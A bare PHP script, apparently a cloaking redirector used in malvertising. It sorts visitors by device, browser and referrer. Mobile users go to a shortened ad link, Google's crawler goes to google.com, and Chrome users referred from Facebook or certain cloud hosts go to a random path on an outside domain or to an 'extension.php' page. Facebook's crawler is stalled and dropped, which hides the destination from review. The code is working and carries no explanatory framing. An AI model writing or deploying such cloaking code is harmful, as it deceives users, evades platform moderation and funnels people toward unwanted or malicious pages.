<?php
ob_start();
require_once('Mobile_Detect.php');
require_once('Browser.php');
$detect = new Mobile_Detect;
$browser = new Browser();

$ads = "http://goo.gl/FcjFNI";
$isref = false;
if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
    $isref = true;
}
if (strpos($_SERVER["HTTP_REFERER"], 'winstonred.com') !== false){
    $isref = true;
}
if (strpos($_SERVER["HTTP_REFERER"], 'rackcdn.com') !== false){
    $isref = true;
}
if (strpos($_SERVER["HTTP_REFERER"], 'windows.net') !== false){
    $isref = true;
}

if($detect->isMobile() || $browser->isMobile()){
  header("Location:".$ads);
  exit();
}else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
  header("location:https://www.google.com");
}else if($browser->getBrowser() == Browser::BROWSER_CHROME && $browser->getPlatform() != Browser::PLATFORM_X11) {
  if($isref == true){
    require_once("config.php");
    if($_SERVER["HTTP_HOST"] != $app_site){
      header("Location:http://rikondofien.info/".rand(55555,999999999));
    }else{
      require_once('extension.php');
    }
  }else{
    header("location:https://www.youtube.com/watch?v=".rand(55555,999999999),true,302);
  }
  exit();
}else{
  ob_end_clean();
  if($browser->isFacebook()){
    ignore_user_abort(true);
    set_time_limit(11);
    ini_set("exit_on_timeout", true);
    sleep(12);
  }
  exit();
}
ob_end_flush();
?>
